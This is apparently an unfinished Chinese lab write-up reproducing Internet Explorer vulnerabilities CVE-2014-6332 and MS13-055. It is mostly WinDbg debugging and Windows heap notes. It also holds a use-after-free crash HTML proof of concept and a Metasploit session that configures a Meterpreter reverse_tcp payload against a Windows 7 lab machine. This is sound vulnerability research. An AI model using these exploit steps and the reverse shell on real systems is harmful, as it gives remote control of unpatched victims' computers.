---
date: 2023-06-01 16:04:26
updated: 2023-06-02
title: CVE-2014-6332复现
layout: post
tags: null
categories:
  - 未写完
---

## 环境






## 产生原因



处理 OLE(Object Linking and Embedding，对象链接与嵌入) 失败 [参考](https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=70116) 。

未对传入参数`psaboundNew`进行有效校验，以致可以越界读写，进而造成任意代码执行。[参考](https://www.anquanke.com/post/id/233824)







## windbg使用命令

参考 [这篇文章](https://github.com/ricew4ng/BrowserSecurity/blob/master/IE8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9ECVE-2012-1876/IE8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9ECVE-2012-1876.md)，当弹出组织框的时候，再用windbg附加进程。

![image-20230602102817727](/CVE-2014-6332/1.png)



```bash
3. 远程调试
windbg.exe -server tcp:port=8888 -p 1324
使用教程参考：https://blog.csdn.net/yjz1409276/article/details/72827257

tcp:port=8888,server=192.168.42.131

4.下载符号文件
.sympath SRV*C:\symbols*https://msdl.microsoft.com/download/symbols
!sym noisy

.symfix
.symfix+ C:\ProgramData\dbg\sym #设置本地符号文件路径 
.sympath
.reload

#重新强制加载某pdb
.reload /f wow64.dll


设置断点

bp address
bu MyDLL!MyFunction

#加载dll时 设置断点
sxe ld:oleaut32.dll 

```



```bash
r rax # 显示寄存器的值
d(bwq) address #显示内存的值
u #反汇编


```



```bash
# 调试命令

sxe ld vbscript.dll # 模块被加载时触发事件 暂停

*g（Go）：这个命令会让程序继续执行，直到遇到下一个断点、异常或者用户手动暂停。
*p（Step over）：这个命令用于单步执行，但如果当前的指令是一个函数调用，它不会进入这个函数，而是执行完整个函数后停下。
*t（Step into）：这个命令也是用于单步执行，如果当前指令是一个函数调用，它会进入这个函数，并在函数的第一条指令上停下。
*gu（Step out）：这个命令会让程序继续执行，直到当前函数返回。

```



显示函数的参数

```bash
I tried the following command
0:000> x /t /d mshtml!CEventObj::GenericGetElement
7d6d51b9 <NoType> mshtml!CEventObj::GenericGetElement = <no type information>
```











## MS13-055



参考文章：[UAF漏洞](https://connormcgarr.github.io/browser1/)

1. C++基础知识

```bash
g++ -Wall -g -o tmp tmp.cpp
```

创建类的时候 会调用constructor。

在调用虚函数时，使用vftable去找要调用的函数。



2. 调试

```bash
.symfix
.reload
bp windbg!main

0:000> u rip L4
windbg!main+0xdd [F:\windbg\windbg\test.cpp @ 96]:
00007ff6`460e2a8d 488b4508        mov     rax,qword ptr [rbp+8]
00007ff6`460e2a91 488b00          mov     rax,qword ptr [rax]
00007ff6`460e2a94 488b4d08        mov     rcx,qword ptr [rbp+8]
00007ff6`460e2a98 ff5008          call    qword ptr [rax+8]

bp 00007ff6`460e2a91
bp 00007ff6`460e2a94
bp 00007ff6`460e2a98
```



3. 以postmortem运行

```bash
D:\Windows Kits\10\Debuggers\x64
.\windbg.exe -I
.\gflags.exe /p /enable F:\windbg\x64\Debug\windbg.exe #打开PageHeap，如果在利用堆漏洞，会导致程序运行失败。打开PageHeap后，可以给更多的提示信息。
```



4. Windows堆基础知识

```bash
0:000> !heap
        Heap Address      NT/Segment Heap

         1ddc8dc0000              NT Heap
         1ddc9ef0000              NT Heap
         1ddc64e0000              NT Heap

dt ntdll!_HEAP 1ddc64e0000
	...
   +0x138 BlocksIndex      : 0x000001dd`c64e02e8 Void
	...
	# 其中 BlocksIndex 就是 _HEAP_LIST_LOOKUP 结构。


dt ntdll!_HEAP_LIST_LOOKUP 0x000001dd`c64e02e8
0:000> dt ntdll!_HEAP_LIST_LOOKUP 0x000001dd`c64e02e8
   +0x000 ExtendedLookup   : (null) 
   +0x008 ArraySize        : 0x80
   +0x00c ExtraItem        : 0
   +0x010 ItemCount        : 1
   +0x014 OutOfRangeItems  : 1
   +0x018 BaseIndex        : 0
   +0x020 ListHead         : 0x000001dd`c64e0150 _LIST_ENTRY [ 0x000001dd`c64e0750 - 0x000001dd`c64e0750 ]
   +0x028 ListsInUseUlong  : 0x000001dd`c64e0320  -> 0
   +0x030 ListHints        : 0x000001dd`c64e0330  -> (null) 
#对其解释如下：
#ntdll!_HEAP_LIST_LOOKUP是一个Windows内核数据结构，它用于优化堆内存的分配和释放。这个结构包含一个数组，数组的每个元素都是一个链表，这些链表用于追踪特定大小的可用内存块。
#每个字段解释如下
```

* ExtendedLookup: 这个字段是一个指向_HEAP_LIST_LOOKUP结构的指针，用于处理大于ArraySize的内存请求。

* ArraySize: 这个字段表示ListHead数组的大小。ArraySize的值表示有多少个不同大小的内存块可以被追踪。
* ExtraItem: 这个字段表示是否有一个额外的元素在ListHead数组的末尾。
* ItemCount: 这个字段表示ListHead数组中当前已经被使用的元素数量。
* OutOfRangeItems: 这个字段表示请求内存大小超出ArraySize范围的次数。 
* BaseIndex: 这个字段表示用于计算内存块大小的基础索引。
* ListHead: 这个字段是一个指向_LIST_ENTRY结构的指针，_LIST_ENTRY结构表示一个双向链表，这个链表中的每个元素都表示一个特定大小的可用内存块。
* ListsInUseUlong: 这个字段是一个指向一个整数数组的指针，这个数组中的每个元素都表示ListHead数组中对应位置的元素是否正在使用。
* ListHints: 这个字段是一个指向_LIST_ENTRY数组的指针，这个数组用于快速找到free掉的内存块。



5. LFH(低碎片堆)

当连续请求18个相同大小的堆块时，就会触发LFH。否则使用的是back-end进行处理。

Windows7中，采用后进先出的方式。

LFH就是Windows7及之后系统的前端管理。Windows10还增加了segment heap。



6. exp初探

完整exp地址：https://www.exploit-db.com/exploits/28187



crash的html代码如下

```bash
<!DOCTYPE html>
    <script>
        window.onload = function() {
            var x = document.getElementById("a");
            x.outerText = "";
        }
    </script>
        <table>
            <tr>
                <div>
                    <span>
                        <q id='a'>
                            <a>
                                <td></td>
                            </a>
                        </q>
                    </span>
                </div>
            </tr>
        </table>
<html>
```



漏洞产生原因：在CTableRow元素后出现 CPhraseElement x，最后元素是子表元素。

CPhraseElement的outerText属性被free掉了，但是还存在于C++的一些链表中。访问已经free掉的元素，就会造成crash。



Docker启动代码

```bash
docker stop xxxx
docker build -t my-nginx .
docker run -d -p 10001:80 my-nginx
```



Windows中设置postmortem模式

```bash
.\windbg.exe -I
```

IE8访问，发生crash，回顾知识点，这是由于UAF和虚函数的使用。



打开PageHeap，（最终）看一看已经释放的内存

```bash
gflags.exe /p /enable iexplore.exe
```



7. poc触发

```bash
#windbg中
lm m mshtml #确认已经加载
x mshtml!CElement* #显示所有以 CElement 开头的符号及其地址
x mshtml!CElement::Doc
  #得到 00000000`7382b68d MSHTML!CElement::Doc = <no type information>

bp 00000000`7382b68d
g
```

出现如下报错

```bash
Breakpoint 0's offset expression evaluation failed.
check for invalid symbols or bas syntax.
WaitForEvent failed
```

删除断点0

```bash
bc 0
g
```



又出现如下报错

```bash
(a74.9ec): Unknow exception -code 00000000(first chance)
(a74.9ec): Unknow exception -code 00000000(!!! second chance!!!)
ntdll_77b70000!NtRaiseException+0x12
```



猜测还是符号路径加载不对，重新加载

```bash
.symfix
.symfix+ c:\symbols
.sympath
.reload
```

出现如下报错

```bash
(40c.57c): Access violation -code c0000005(!!! second chance!!!)
ntdll_77b70000!NtRaiseException+0x12
```

!heap 出现如下信息

```bash
your debugger is not using the correct symbols
```



8. 关闭ASLR

kb查看调用栈，发现有MSHML:CElement。

文章中给出的是停在了 MSHTML!CElement，

设置断点： 

```bash
x MSHTML!CElement::EnsureRecalcNotiry
	# 74e656de
bu 74e656de

# 查看汇编代码
u 74e656de L10
```



9. 查看调用栈

```bash
kv (or kb)
```

发现有MSHTML!CElement 的两个函数。

![image-20230607111402057](/CVE-2014-6332/2.png)

但是暂停的地方和参考文章位置不一样，我猜测是因为系统版本不同导致的。参考文章使用x86，我使用x64。



使用其他命令如 analyze来分析

```bash
!analyze -v
```
![3](/CVE-2014-6332/3.png)

查看反汇编代码，如下。

![4](/CVE-2014-6332/4.png)


这几行反汇编的作用是调用虚函数表，需要借用虚函数指针(vptr)。

* 首先ecx作为vptr，进行废弃，存储到eax中，这时eax也是一个vptr。

* 其次eax取其指向的虚函数表的 0x70处的值，赋值给edx。此时edx表示一个虚函数。

* 调用edx，即调用该虚函数。

![5](/CVE-2014-6332/5.png)


10. 查看堆结构



```bash
r #查看寄存器的值
!heap -p #显示可用堆
!heap -p -a ecx #寄存器
!heap -i [address] #地址
```



11. 找到free发生的地方

最终free的执行权是交给Windows API的。

IDA分析mshtml.dll（位于 C:\Windows\system32）（为了方便，没有使用Windows7虚拟机中的，而是使用Windows10宿主机中的）。

下载PDB: https://github.com/rajkumar-rangaraj/PDB-Downloader

IDA加载，找到 CTreeNode::ComputeFormatsHelper

![image-20230607174406211](/CVE-2014-6332/6.png)

进入Cleanup函数，其中直接就有HeapFree函数。
![7](/CVE-2014-6332/7.png)

Cleanup中也有  CCustomCursor::`scalar deleting destructor'(v5, a2); 这个小片段和参考文章中的是一样的。
![8](/CVE-2014-6332/8.png)

12. 关闭PageHeap

```bash
gflags.exe /p /enable iexplore.exe
```



### 待看

主参考文章：https://connormcgarr.github.io/browser1/

exp: https://www.exploit-db.com/exploits/28187









.sympath SRV*cache*https://msdl.microsoft.com/download/symbols







## CVE-2014-6332















### msfconsole复现

参考：https://www.cnblogs.com/tsimfeiwan/p/11993640.html

```bash
msfconsole
search MS14_064
use exploit/windows/browser/ms14_064_ole_code_execution
show payloads
```



```bash
msf6 exploit(windows/browser/ms14_064_ole_code_execution) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```



设置

```bash
set AllowPowershellPrompt true
set SRVHOST 172.16.1.110
set LHOST 172.16.1.110
exploit
```



🌟 **问题1:** 在执行的过程中，遇到Windows7出现：
![9](/CVE-2014-6332/9.png)

**解决方案1：**开始--->控制面板--->用户账户--->更改用户帐户控制设置--->从不通知。





🌟 **问题2:** 上述报错没有了，但是没有攻击成功，没有弹出窗口。

**解决方案1:** 关闭防火墙。又报错



### 待看

safari加了很多链接



## 其它漏洞



* CVE-2013-1347

https://securityintelligence.com/cve-2013-1347-microsoft-internet-explorer-cgenericelement-object-use-after-free-vulnerability/





* 杂教程

https://fuzzysecurity.com/tutorials.html

https://mp.weixin.qq.com/s/GWjCUidztHhOg4yCmEwlHg